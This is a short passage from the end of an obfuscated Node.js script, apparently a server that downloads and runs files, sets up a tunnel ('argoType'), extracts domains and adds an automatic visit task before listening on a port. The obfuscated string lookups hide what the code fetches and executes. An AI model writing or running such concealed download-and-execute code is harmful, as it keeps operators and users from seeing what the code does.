console['log'](_0x1190cd(0x21d)),_0x5b33c0;}catch(_0x13d25a){return console['error']('Add\x20automatic\x20access\x20task\x20faild:\x20'+_0x13d25a[_0x1190cd(0x212)]),null;}}async function startserver(){const _0x28d2ac=_0x36ddab;try{argoType(),deleteNodes(),cleanupOldFiles(),await generateConfig(),await downloadFilesAndRun(),await extractDomains(),await AddVisitTask();}catch(_0x10c712){console[_0x28d2ac(0x25e)]('Error\x20in\x20startserver:',_0x10c712);}}startserver()[_0x36ddab(0x23c)](_0x5685dc=>{const _0x3aa7eb=_0x36ddab;console[_0x3aa7eb(0x25e)](_0x3aa7eb(0x21b),_0x5685dc);}),app[_0x36ddab(0x22c)](PORT,()=>console[_0x36ddab(0x1db)](_0x36ddab(0x24b)+PORT+'!'));
